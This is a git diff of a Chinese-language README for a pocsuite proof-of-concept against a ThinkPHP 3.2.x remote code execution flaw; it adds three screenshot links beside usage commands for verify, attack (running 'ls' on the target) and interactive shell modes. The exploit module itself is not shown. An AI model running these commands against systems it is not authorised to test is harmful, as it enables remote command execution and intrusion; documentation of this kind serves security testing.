@@ -26,6 +26,7 @@
 pocsuite -r pocs/ThinkPHP_3_2_x_rce.py -u http:// 10.11.34.64/thinkphp/ --verify
 ```
 
+![image](https://user-images.githubusercontent.com/37897216/233998663-681f0248-2522-4910-ba04-b5cb1029b222.png)
 
 
 ## 攻击模式
@@ -36,6 +37,7 @@ Linux与Windows平台均兼容，注意不同平台执行命令即可。
 pocsuite -r pocs/ThinkPHP_3_2_x_rce.py -u http:// 10.11.34.64/thinkphp/ --attack –cmd ls
 ```
 
+![image](https://user-images.githubusercontent.com/37897216/233998710-c3b1710d-5e66-42f2-bf12-806a4c2901a9.png)
 
 
 ## Shell模式
@@ -43,5 +45,8 @@ pocsuite -r pocs/ThinkPHP_3_2_x_rce.py -u http:// 10.11.34.64/thinkphp/ --attack
 ```bash
 python3 cli.py -r pocs/ThinkPHP_3_2_x_rce.py  -u http://127.0.0.1:8082/thinkphp/ --shell 
 ```
+
+![image](https://user-images.githubusercontent.com/37897216/233998760-e765acb8-6d41-447e-baf9-1c639f202c1c.png)
+
 
 **参考链接: https://www.seebug.org/vuldb/ssvid-99297**
